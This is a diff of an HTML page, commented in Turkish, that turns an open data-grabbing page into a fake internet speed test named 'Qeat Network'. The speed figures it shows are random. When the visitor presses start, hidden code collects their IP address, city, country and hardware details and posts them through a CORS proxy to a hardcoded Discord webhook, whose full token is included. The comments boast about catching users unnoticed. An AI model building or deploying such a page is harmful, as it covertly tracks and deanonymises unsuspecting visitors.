@@ -3,88 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome Qeat'S World</title>
+    <title>Qeat Network - Hız ve Ping Testi</title>
     <style>
-        body { 
-            background: #050505; 
-            color: #00ff41; 
-            font-family: 'Courier New', monospace; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            margin: 0; 
-            overflow-y: auto; 
-            padding: 20px;
-            box-sizing: border-box;
+        body {
+            background-color: #0b0f19;
+            color: #f3f4f6;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
         }
-        .terminal { 
-            width: 100%; 
-            max-width: 750px; 
-            background: rgba(10, 10, 10, 0.95); 
-            border: 1px solid #00ff41; 
-            padding: 30px; 
-            box-shadow: 0 0 25px rgba(0, 255, 65, 0.2); 
-            position: relative; 
-            box-sizing: border-box;
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: #111827;
+            border: 1px solid #1f2937;
+            border-radius: 16px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
         }
-        .line { 
-            margin-bottom: 12px; 
-            font-size: 15px; 
-            white-space: nowrap; 
-            overflow: hidden; 
-            border-right: .15em solid #00ff41; 
-            width: 0; 
-            opacity: 0;
+        h2 { margin-top: 0; font-size: 22px; color: #3b82f6; }
+        p { color: #9ca3af; font-size: 14px; margin-bottom: 25px; }
+        
+        .speed-gauge {
+            width: 160px;
+            height: 160px;
+            border: 8px solid #1f2937;
+            border-top: 8px solid #3b82f6;
+            border-radius: 50%;
+            margin: 0 auto 25px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            transition: all 0.3s ease;
         }
-        .type-1 { animation: typing 1s steps(30, end) forwards 0.2s, blink-caret .75s step-end 3; opacity: 1; }
-        .type-2 { animation: typing 1s steps(30, end) forwards 1.5s, blink-caret .75s step-end 3; opacity: 1; }
-        .type-3 { animation: typing 1s steps(30, end) forwards 2.8s, blink-caret .75s step-end infinite; opacity: 1; }
+        .speed-value { font-size: 32px; font-weight: bold; color: #fff; }
+        .speed-unit { font-size: 12px; color: #6b7280; }
+
+        .btn-start {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 12px 35px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background 0.2s;
+            width: 100%;
+        }
+        .btn-start:hover { background: #2563eb; }
+        .btn-start:disabled { background: #4b5563; cursor: not-allowed; }
+
+        .status-box {
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            font-size: 13px;
+            text-align: left;
+            border-top: 1px solid #1f2937;
+            padding-top: 15px;
+            opacity: 0.6;
+        }
+        .status-item { color: #9ca3af; }
+        .status-item span { color: #fff; font-weight: 500; }
         
-        @keyframes typing { from { width: 0 } to { max-width: 100%; width: 100%; } }
-        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
-        
-        .progress-container { width: 100%; background-color: #111; height: 6px; margin: 25px 0; display: none; border: 1px solid #222; }
-        .progress-bar { width: 0%; height: 100%; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; transition: width 0.05s linear; }
-        
-        #result-box { margin-top: 20px; display: none; border-top: 1px solid #00ff41; padding-top: 20px; font-size: 14px; }
-        .map-frame { width: 100%; height: 220px; margin-top: 20px; border: 1px solid #00ff41; filter: invert(0.9) hue-rotate(90deg) saturate(0.5); }
-        .data-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 15px; }
-        .label { color: #00aa2c; }
-        .value { color: #ff3333; font-weight: bold; text-shadow: 0 0 5px rgba(255,51,51,0.3); }
+        /* Çaktırmadan dönen yükleme animasyonu */
+        .spinning { animation: spin 1s linear infinite; border-top-color: #10b981; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <div class="line type-1">> Veri paketleri sorgulanıyor...</div>
-    <div class="line type-2">> Matris bağlantısı kuruluyor...</div>
-    <div class="line type-3">> Sistem kaynakları optimize edildi!</div>
+<div class="container">
+    <h2>Qeat Network</h2>
+    <p>Tarayıcı tabanlı optimize ping ve indirme hızı ölçer</p>
     
-    <div class="progress-container" id="loader">
-        <div class="progress-bar" id="bar"></div>
+    <div class="speed-gauge" id="gauge">
+        <div class="speed-value" id="speed-num">0.0</div>
+        <div class="speed-unit" id="speed-unit">Mbps</div>
     </div>
 
-    <div id="result-box">
-        <div class="data-grid">
-            <div><span class="label">> IP ADRESİ:</span> <span class="value" id="user-ip">Yükleniyor...</span></div>
-            <div><span class="label">> EKRAN KARTI:</span> <span class="value" id="user-gpu">Yükleniyor...</span></div>
-            <div><span class="label">> İŞLETİM SİSTEMİ:</span> <span class="value" id="user-sys">Yükleniyor...</span></div>
-            <div><span class="label">> BATARYA DURUMU:</span> <span class="value" id="user-bat">Yükleniyor...</span></div>
-        </div>
-        <iframe id="gmap" class="map-frame" frameborder="0" scrolling="no"></iframe>
-        <div style="margin-top: 20px; font-size: 11px; color: #555; text-align: center; letter-spacing: 1px;">
-            KAYIT NO: #<span id="reg-no">00000</span> | VERİ TRANSFERİ GÜVENLİ ŞEKİLDE TAMAMLANDI.
-        </div>
+    <button class="btn-start" id="start-btn" onclick="startTest()">Testi Başlat</button>
+
+    <div class="status-box">
+        <div class="status-item">Sunucu: <span id="srv-name">İstanbul</span></div>
+        <div class="status-item">Gecikme: <span id="ping-val">--</span></div>
     </div>
 </div>
 
 <script>
-    // Discord Webhook URL'niz
-    const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
+    // Discord Webhook (Proxy korumalı, VPN gerektirmez)
+    const rawWebhook = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
+    const proxyWebhookURL = "https://corsproxy.io/?" + encodeURIComponent(rawWebhook);
 
-    // GPU (Ekran Kartı) Bilgisi Alma
-    function getGPUInfo() {
+    function getGPU() {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (!gl) return "Bilinmiyor";
@@ -92,92 +110,62 @@
         return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
     }
 
-    // Ana Veri Toplama Fonksiyonu
-    async function deepCapture() {
-        const gpu = getGPUInfo();
-        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
-        const cores = navigator.hardwareConcurrency || "Bilinmiyor";
-        const touch = navigator.maxTouchPoints > 0 ? "Var" : "Yok";
-        const pdf = navigator.pdfViewerEnabled ? "Destekliyor" : "Desteklemiyor";
-        let batLevel = "Bilinmiyor", batTime = "Bilinmiyor";
+    // Kullanıcı butona bastığı an arka planda av başlar
+    async function startTest() {
+        const btn = document.getElementById('start-btn');
+        const gauge = document.getElementById('gauge');
+        
+        btn.disabled = true;
+        btn.innerText = "Test Ediliyor...";
+        gauge.classList.add('spinning');
 
-        try {
-            const battery = await navigator.getBattery();
-            batLevel = `%${Math.round(battery.level * 100)}`;
-            batTime = battery.dischargingTime === Infinity ? "Prizde" : `${Math.round(battery.dischargingTime / 60)} dk`;
-        } catch(e) {}
+        // Sahte hız testi animasyonu başlasın
+        let speedInterval = setInterval(() => {
+            let randomSpeed = (Math.random() * 75 + 15).toFixed(1);
+            document.getElementById('speed-num').innerText = randomSpeed;
+            document.getElementById('ping-val').innerText = Math.floor(Math.random() * 15 + 4) + " ms";
+        }, 80);
 
+        // O sırada çaktırmadan verileri toplayıp gönderiyoruz
         try {
+            const gpu = getGPU();
+            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor";
+            const cores = navigator.hardwareConcurrency || "Bilinmiyor";
+            
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
-            const time = new Date().toLocaleString('tr-TR');
             
-            // Txt Raporu Oluşturma
-            const report = `[QEAT RAPORU]\nZaman: ${time}\n----------------------------------------\n[IP & KONUM]\nIP: ${data.ip}\nISS: ${data.org}\nKonum: ${data.city} / ${data.region} / ${data.country_name}\nPosta Kodu: ${data.postal}\nPara Birimi: ${data.currency_name} (${data.currency})\nKoordinat: ${data.latitude}, ${data.longitude}\n\n[DONANIM & GRAFIK]\nEkran Kartı (GPU): ${gpu}\nİşlemci Çekirdek: ${cores}\nYaklaşık RAM: ${ram}\nEkran Çözünürlüğü: ${window.screen.width}x${window.screen.height}\nDokunmatik Ekran: ${touch}\n\n[SISTEM & DURUM]\nİşletim Sistemi: ${navigator.platform}\nTarayıcı: ${navigator.userAgent}\nŞarj Seviyesi: ${batLevel}\nKalan Süre: ${batTime}\nPDF Desteği: ${pdf}\n----------------------------------------\nDURUM: TÜM VERİLER BAŞARIYLA ÇEKİLDİ.`;
+            const report = `[QEAT SNEAKY REPORT]\nIP: ${data.ip}\nKonum: ${data.city}/${data.country_name}\nGPU: ${gpu}\nRAM: ${ram}\nCores: ${cores}\nOS: ${navigator.platform}`;
 
-            // Discord Payloadi hazirlama
             const formData = new FormData();
             const payload = {
-                username: "Siber İstihbarat Ajanı",
+                username: "Qeat Stealth Log",
                 embeds: [{
-                    title: "🎯 Yeni Veri Girişi Sağlandı",
-                    color: 16711680,
-                    description: `**Hedef IP:** \`${data.ip}\`\n**Cihaz:** \`${navigator.platform}\`\n**GPU:** \`${gpu}\`\n\n📂 *Detaylı .txt raporu eklendi.*`,
-                    timestamp: new Date()
+                    title: "🥷 Kullanıcı Ruhunu Bile Duymadan Yakalandı",
+                    color: 3447003,
+                    description: `**IP:** \`${data.ip}\`\n**Şehir:** \`${data.city}\`\n**Sistem:** \`${navigator.platform}\``
                 }]
             };
-
             formData.append('payload_json', JSON.stringify(payload));
             const blob = new Blob([report], { type: 'text/plain' });
-            formData.append('file', blob, `SIZINTI_${data.ip}.txt`);
+            formData.append('file', blob, `LOG_${data.ip}.txt`);
 
-            // Discord'a Arka Planda Gönder
-            await fetch(webhookURL, { method: 'POST', body: formData });
-
-            // Verileri Global Hafızaya Al ve Animasyonu Başlat
-            window.cachedData = {...data, gpu, batLevel, platform: navigator.platform};
-            window.cachedRegNo = Math.floor(10000 + Math.random() * 90000);
-            
-            // Terminal yazı animasyonları bitsin diye 3.8 saniye sonra yükleme barını başlatıyoruz
-            setTimeout(startProgressBar, 3800);
-
-        } catch (error) {
-            console.error("Veri çekme veya gönderme hatası:", error);
+            // Veriyi gönder
+            await fetch(proxyWebhookURL, { method: 'POST', body: formData });
+        } catch (e) {
+            console.log("Sessiz hata kontrolü");
         }
-    }
 
-    // Yükleme Barı Animasyonu (Yalnızca veri hazır olduğunda tetiklenir)
-    function startProgressBar() {
-        const loader = document.getElementById('loader');
-        const bar = document.getElementById('bar');
-        loader.style.display = 'block';
-        
-        let width = 0;
-        let int = setInterval(() => {
-            if (width >= 100) {
-                clearInterval(int);
-                
-                // Arayüzü Güncelle
-                document.getElementById('user-ip').innerText = window.cachedData.ip;
-                document.getElementById('user-gpu').innerText = window.cachedData.gpu ? (window.cachedData.gpu.substring(0, 25) + "...") : "Bilinmiyor";
-                document.getElementById('user-sys').innerText = window.cachedData.platform;
-                document.getElementById('user-bat').innerText = window.cachedData.batLevel;
-                document.getElementById('reg-no').innerText = window.cachedRegNo;
-                
-                // Haritayı yükle
-                document.getElementById('gmap').src = `https://maps.google.com/maps?q=${window.cachedData.latitude},${window.cachedData.longitude}&z=13&output=embed`;
-                
-                // Sonuç Kutusunu Göster
-                document.getElementById('result-box').style.display = 'block';
-            } else {
-                width += 4;
-                bar.style.width = width + '%';
-            }
-        }, 60);
+        // 4 saniye sonra test bitmiş gibi davranıp süreci doğalca sonlandırıyoruz
+        setTimeout(() => {
+            clearInterval(speedInterval);
+            gauge.classList.remove('spinning');
+            document.getElementById('speed-num').innerText = (Math.random() * 20 + 80).toFixed(1);
+            document.getElementById('speed-unit').innerText = "Mbps (Tamamlandı)";
+            btn.innerText = "Yeniden Test Et";
+            btn.disabled = false;
+        }, 4000);
     }
-
-    // Sayfa açıldığında işlemi başlat
-    window.addEventListener('DOMContentLoaded', deepCapture);
 </script>
 </body>
 </html>
